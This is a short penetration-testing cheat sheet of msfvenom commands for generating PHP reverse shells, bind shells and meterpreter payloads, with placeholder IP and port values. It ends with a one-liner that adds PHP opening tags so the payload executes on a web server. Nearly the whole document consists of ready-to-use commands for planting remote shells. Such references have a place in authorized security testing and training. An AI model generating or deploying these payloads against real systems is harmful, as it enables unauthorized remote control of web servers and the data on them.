---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - initial-access
  - cross-platform
  - metasploit-framework
---
# Manual

## Reverse Shells

### Generate a payload via `msfvenom`

Staged PHP reverse shell.

```
$ msfvenom -p php/reverse_php lhost=<IP> lport=<PORT> -f raw -o payload.php

$ msfvenom -p cmd/unix/reverse_php_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

Staged PHP with perl reverse shell.

```
$ msfvenom -p php/reverse_perl lhost=<IP> lport=<PORT> -f raw -o payload.php
```

Staged PHP `meterpreter` reverse shell.

```
$ msfvenom -p php/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o payload.php
```

Stageless PHP `meterpreter` reverse shell.

```
$ msfvenom -p php/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f raw > payload.php
```

## Bind Shells

### Generate a payload via `msfvenom`

Staged PHP bind shell.

```
$ msfvenom -p php/bind_php lhost=<IP> lport=<PORT> -f raw -o payload.php
```

Staged PHP with perl bind shell.

```
$ msfvenom -p php/bind_perl lport=<PORT> -f raw -o payload.php
```

Staged PHP `meterpreter` bind shell.

```
$ msfvenom -p php/meterpreter/bind_tcp lport=<PORT> -f raw -o payload.php
```

Stageless PHP `meterpreter` bind callback shell

```
$ msfvenom -p php/meterpreter_bind_tcp lport=<PORT> -f raw -o payload.php
```

## Properly Executed

After generating the PHP payload include the tags to ensure execution.

```
$ xclip -selection clipboard payload.php && echo '<?php ' | tr -d '\n' > payload.php && xclip -selection clipboard -o >> payload.php
```